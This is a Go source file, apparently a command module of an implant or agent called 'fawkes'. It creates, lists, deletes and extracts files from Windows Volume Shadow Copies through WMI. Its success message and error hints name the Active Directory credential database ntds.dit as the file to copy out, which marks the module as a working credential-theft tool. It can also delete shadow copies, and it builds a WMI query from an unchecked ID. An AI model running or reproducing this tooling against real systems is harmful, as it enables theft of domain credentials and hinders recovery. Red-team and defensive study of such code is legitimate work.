//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"runtime"
	"strings"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"fawkes/pkg/structs"
)

type VSSCommand struct{}

func (c *VSSCommand) Name() string {
	return "vss"
}

func (c *VSSCommand) Description() string {
	return "Manage Volume Shadow Copies — list, create, delete, and extract files"
}

type vssArgs struct {
	Action string `json:"action"`
	Volume string `json:"volume"`
	ID     string `json:"id"`
	Source string `json:"source"`
	Dest   string `json:"dest"`
}

func (c *VSSCommand) Execute(task structs.Task) structs.CommandResult {
	var args vssArgs

	if task.Params == "" {
		return errorResult("Error: parameters required.\nActions: list, create, delete, extract")
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return vssList()
	case "create":
		return vssCreate(args)
	case "delete":
		return vssDelete(args)
	case "extract":
		return vssExtract(args)
	default:
		return errorf("Unknown action: %s\nAvailable: list, create, delete, extract", args.Action)
	}
}

// vssWMIConnect connects to root\CIMV2 for VSS operations.
func vssWMIConnect() (*ole.IDispatch, *ole.IDispatch, func(), error) {
	runtime.LockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			runtime.UnlockOSThread()
			return nil, nil, nil, fmt.Errorf("CoInitializeEx failed: %v", err)
		}
	}

	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("failed to create SWbemLocator: %v", err)
	}
	locator, err := unknown.QueryInterface(ole.IID_IDispatch)
	unknown.Release()
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("failed to query IDispatch: %v", err)
	}

	serviceResult, err := oleutil.CallMethod(locator, "ConnectServer", "", `root\CIMV2`)
	if err != nil {
		locator.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("ConnectServer failed: %v", err)
	}
	services := serviceResult.ToIDispatch()

	cleanup := func() {
		services.Release()
		locator.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
	}

	return locator, services, cleanup, nil
}

// vssList enumerates all shadow copies.
func vssList() structs.CommandResult {
	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
		"SELECT ID, DeviceObject, VolumeName, InstallDate, OriginatingMachine, ServiceMachine FROM Win32_ShadowCopy")
	if err != nil {
		return errorf("Error querying shadow copies: %v", err)
	}
	defer resultSet.Clear()

	resultDisp := resultSet.ToIDispatch()
	var sb strings.Builder
	sb.WriteString("Volume Shadow Copies:\n\n")

	count := 0
	err = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
		item := v.ToIDispatch()
		// Note: do NOT Release item — ForEach manages the VARIANT lifecycle

		idResult, _ := oleutil.GetProperty(item, "ID")
		devResult, _ := oleutil.GetProperty(item, "DeviceObject")
		volResult, _ := oleutil.GetProperty(item, "VolumeName")
		dateResult, _ := oleutil.GetProperty(item, "InstallDate")
		origResult, _ := oleutil.GetProperty(item, "OriginatingMachine")

		id := ""
		if idResult != nil {
			id = idResult.ToString()
			idResult.Clear()
		}
		dev := ""
		if devResult != nil {
			dev = devResult.ToString()
			devResult.Clear()
		}
		vol := ""
		if volResult != nil {
			vol = volResult.ToString()
			volResult.Clear()
		}
		date := ""
		if dateResult != nil {
			date = dateResult.ToString()
			dateResult.Clear()
		}
		orig := ""
		if origResult != nil {
			orig = origResult.ToString()
			origResult.Clear()
		}

		if count > 0 {
			sb.WriteString("\n")
		}
		count++
		sb.WriteString(fmt.Sprintf("  [%d] ID: %s\n", count, id))
		sb.WriteString(fmt.Sprintf("      Device: %s\n", dev))
		sb.WriteString(fmt.Sprintf("      Volume: %s\n", vol))
		sb.WriteString(fmt.Sprintf("      Created: %s\n", date))
		sb.WriteString(fmt.Sprintf("      Machine: %s\n", orig))
		return nil
	})

	if err != nil {
		return errorf("Error enumerating shadow copies: %v\n%s", err, sb.String())
	}

	if count == 0 {
		sb.WriteString("  (none found)\n")
	}
	sb.WriteString(fmt.Sprintf("\nTotal: %d shadow copies\n", count))

	return successResult(sb.String())
}

// vssCreate creates a new shadow copy.
func vssCreate(args vssArgs) structs.CommandResult {
	volume := args.Volume
	if volume == "" {
		volume = "C:\\"
	}
	if !strings.HasSuffix(volume, "\\") {
		volume += "\\"
	}

	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	// Get the Win32_ShadowCopy class
	classResult, err := oleutil.CallMethod(services, "Get", "Win32_ShadowCopy")
	if err != nil {
		return errorf("Error getting Win32_ShadowCopy class: %v", err)
	}
	defer classResult.Clear()
	classDisp := classResult.ToIDispatch()

	// Call Win32_ShadowCopy.Create(Volume, Context)
	// Context = "ClientAccessible" for standard VSS snapshot
	createResult, err := oleutil.CallMethod(classDisp, "Create", volume, "ClientAccessible")
	if err != nil {
		return errorf("Error creating shadow copy: %v\nRequires administrator privileges.", err)
	}
	defer createResult.Clear()

	retVal := createResult.Value()

	// Query all shadow copies to find the newest one (the one we just created).
	// VolumeName in WMI is a volume GUID path, not the drive letter, so we
	// query all copies and take the last (newest) one.
	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
		"SELECT ID, DeviceObject FROM Win32_ShadowCopy")
	if err == nil {
		defer resultSet.Clear()
		resultDisp := resultSet.ToIDispatch()
		var lastID, lastDev string
		_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
			item := v.ToIDispatch()
			idR, _ := oleutil.GetProperty(item, "ID")
			devR, _ := oleutil.GetProperty(item, "DeviceObject")
			if idR != nil {
				lastID = idR.ToString()
				idR.Clear()
			}
			if devR != nil {
				lastDev = devR.ToString()
				devR.Clear()
			}
			return nil
		})
		if lastDev != "" {
			return successf("Shadow copy created:\n  Volume: %s\n  ID: %s\n  Device: %s\n  Return Value: %v\n\nExtract files with:\n  vss -action extract -id \"%s\" -source \"\\Windows\\NTDS\\ntds.dit\" -dest \"C:\\temp\\ntds.dit\"", volume, lastID, lastDev, retVal, lastDev)
		}
	}

	return successf("Shadow copy created:\n  Volume: %s\n  Return Value: %v (0 = Success)", volume, retVal)
}

// vssDelete deletes a shadow copy by ID.
func vssDelete(args vssArgs) structs.CommandResult {
	if args.ID == "" {
		return errorResult("Error: id is required (shadow copy ID from list output)")
	}

	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	// Query for the specific shadow copy
	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
		fmt.Sprintf("SELECT * FROM Win32_ShadowCopy WHERE ID = '%s'", args.ID))
	if err != nil {
		return errorf("Error querying shadow copy: %v", err)
	}
	defer resultSet.Clear()

	resultDisp := resultSet.ToIDispatch()
	deleted := false
	var deleteErr error

	_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
		item := v.ToIDispatch()
		_, err := oleutil.CallMethod(item, "Delete_")
		if err != nil {
			deleteErr = err
			return err
		}
		deleted = true
		return nil
	})

	if deleteErr != nil {
		return errorf("Error deleting shadow copy: %v\nRequires administrator privileges.", deleteErr)
	}

	if !deleted {
		return errorf("Shadow copy not found: %s", args.ID)
	}

	return successf("Shadow copy deleted: %s", args.ID)
}

// vssExtract copies a file from a shadow copy to a destination.
func vssExtract(args vssArgs) structs.CommandResult {
	if args.ID == "" {
		return errorResult("Error: id is required (shadow copy device path, e.g., \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1)")
	}
	if args.Source == "" {
		return errorResult("Error: source is required (path within shadow copy, e.g., \\Windows\\NTDS\\ntds.dit)")
	}
	if args.Dest == "" {
		return errorResult("Error: dest is required (local destination path)")
	}

	// Build the full shadow copy path
	// Device path is like \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
	sourcePath := args.ID
	if !strings.HasSuffix(sourcePath, "\\") {
		sourcePath += "\\"
	}
	// Source path should be relative (e.g., Windows\NTDS\ntds.dit)
	source := strings.TrimPrefix(args.Source, "\\")
	sourcePath += source

	// Open source file from shadow copy
	srcFile, err := os.Open(sourcePath)
	if err != nil {
		return errorf("Error opening shadow copy file: %v\nPath: %s", err, sourcePath)
	}
	defer srcFile.Close()

	// Create destination file
	dstFile, err := os.Create(args.Dest)
	if err != nil {
		return errorf("Error creating destination file: %v", err)
	}
	defer dstFile.Close()

	// Copy the file
	bytesCopied, err := io.Copy(dstFile, srcFile)
	if err != nil {
		return errorf("Error copying file: %v (copied %d bytes before failure)", err, bytesCopied)
	}

	return successf("Extracted from shadow copy:\n  Source: %s\n  Dest: %s\n  Size: %d bytes", sourcePath, args.Dest, bytesCopied)
}
